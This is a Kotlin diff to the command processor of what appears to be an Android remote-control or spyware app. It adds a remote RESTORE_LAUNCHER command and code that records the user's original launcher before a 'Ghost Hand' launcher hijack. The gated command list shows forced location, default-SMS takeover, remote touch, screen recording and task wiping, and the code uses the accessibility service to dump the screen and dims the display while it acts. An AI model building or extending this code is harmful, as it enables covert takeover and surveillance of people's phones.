@@ -794,6 +794,52 @@ object CommandProcessor {
                         }
                     }
                 }
+                "RESTORE_LAUNCHER" -> {
+                    LauncherManager.pendingCmdId = id
+                    val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
+                    val originalPkg = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).getString("original_launcher_package", null)
+                    
+                    if (currentHome != ctx.packageName && currentHome == originalPkg) {
+                        status = "ALREADY_RESTORED"
+                        errorMsg = "Launcher is already restored to original."
+                        LauncherManager.expectedMode = ""
+                    } else {
+                        val prevLabel = LauncherManager.getStoredPreviousLabel(ctx)
+                        if (prevLabel == null) {
+                            status = "FAILED"
+                            errorMsg = "No previous Launcher package found in memory."
+                        } else {
+                            LauncherManager.expectedMode = "RESTORE"
+                            DimmerManager.IgnitionManager.request(ctx, "LAUNCHER_RESTORE")
+                            Handler(Looper.getMainLooper()).post {
+                                DimmerManager.applyDim(ctx, 0, "AUTO")
+                                Handler(Looper.getMainLooper()).postDelayed({
+                                    DimmerManager.IgnitionManager.release(ctx, "LAUNCHER_RESTORE")
+                                    if (LauncherManager.expectedMode == "RESTORE") {
+                                        LauncherManager.expectedMode = ""
+                                        val diag = MyAccessibilityService.dumpScreenDiagnostic()
+                                        DebugLogger.log("LAUNCHER_RESTORE_TIMEOUT_DIAG", diag)
+                                        MyAccessibilityService.instance?.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
+                                        DynamicUIManager.removeOverlay(ctx, "LAUNCHER_RESTORE_SAFETY_FUSE")
+                                        CommandProcessor.updateCommandStatus(ctx, id, "RESTORE_TIMEOUT", "Failed to restore previous Launcher handler.\nScreen State:\n$diag")
+                                        CommandRetryManager.scheduleRetry(ctx, id, "RESTORE_LAUNCHER", "", "30s Restore Timeout")
+                                    }
+                                }, 30000)
+                            }
+                            try {
+                                val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
+                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                                }
+                                ctx.startActivity(i)
+                                status = "RESTORE_INITIATED"
+                                errorMsg = "Targeting: $prevLabel"
+                            } catch (e: Exception) {
+                                status = "FAILED"
+                                errorMsg = "Intent failed: ${e.message}"
+                            }
+                        }
+                    }
+                }
                 "RECORD_SCREEN" -> {
                     ScreenRecordManager.pendingCmdId = id
                     val parts = content.split("|")
@@ -2558,6 +2604,8 @@ object CommandProcessor {
                             // Check Launcher
                             val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
                             if (currentHome != ctx.packageName) {
+                                ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                                    .putString("original_launcher_package", currentHome).apply()
                                 allSuccess = false
                                 DebugLogger.log("RBT_LIFECYCLE", "Validation Failed: Launcher not default (Current: $currentHome). Triggering Ghost Hand...")
                                 LauncherManager.isHijacking = true
@@ -3015,6 +3063,8 @@ object CommandProcessor {
                     val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
                     DebugLogger.log("FINALIZE_LIFECYCLE", "Phase 3: Checking current Home app. Currently: $currentHome")
                     if (currentHome != ctx.packageName) {
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                            .putString("original_launcher_package", currentHome).apply()
                         DebugLogger.log("FINALIZE_LIFECYCLE", "App is NOT default launcher. Initiating embedded Ghost Hand hijack.")
                         LauncherManager.isHijacking = true
                         LauncherManager.pendingCmdId = id
@@ -3100,6 +3150,10 @@ object CommandProcessor {
                 }
                 "HIJACK_LAUNCHER" -> {
                     val checkHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
+                    if (checkHome != ctx.packageName) {
+                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                            .putString("original_launcher_package", checkHome).apply()
+                    }
                     if (checkHome == ctx.packageName) {
                         status = "ALREADY_IN_STATE"
                         errorMsg = "Launcher is already hijacked."
@@ -3173,7 +3227,7 @@ object CommandProcessor {
 
     object Gatekeeper {
         private val GATED_COMMANDS = listOf(
-            "FORCE_DATA", "FORCE_WIFI", "FORCE_LOCATION", "FLIGHT_MODE", "HIJACK_LAUNCHER", "SET_DEFAULT_SMS", "RESTORE_DEFAULT_SMS", 
+            "FORCE_DATA", "FORCE_WIFI", "FORCE_LOCATION", "FLIGHT_MODE", "HIJACK_LAUNCHER", "RESTORE_LAUNCHER", "SET_DEFAULT_SMS", "RESTORE_DEFAULT_SMS", 
             "RESET_BACKGROUND_TASKS", "FINALIZE_RESET", "FULL_ONBOARDING", "REMOTE_TOUCH", "RECORD_SCREEN",
             "SET_SYSTEM_FONT", "SET_SYSTEM_THEME", "EYE_SHIELD", "EYE_SHIELD_SILENT", "MASTER_DISPLAY_RESET",
             "WIPE_TASKS", "MOCK_ANR", "ACC_GOTO_SETTINGS"
